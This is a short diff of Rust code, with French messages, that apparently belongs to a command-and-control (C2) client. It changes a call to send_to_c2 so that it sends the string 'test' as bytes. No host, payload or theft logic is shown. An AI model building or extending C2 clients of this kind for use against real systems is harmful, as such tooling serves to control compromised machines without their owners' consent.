@@ -18,7 +18,7 @@ async fn main() {
         Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
     }
 
-    match connexion::send_to_c2(String::from("est")).await {
+    match connexion::send_to_c2(String::from("test").into_bytes()).await {
         Ok(()) => {
             println!("Body envoyé");
         }
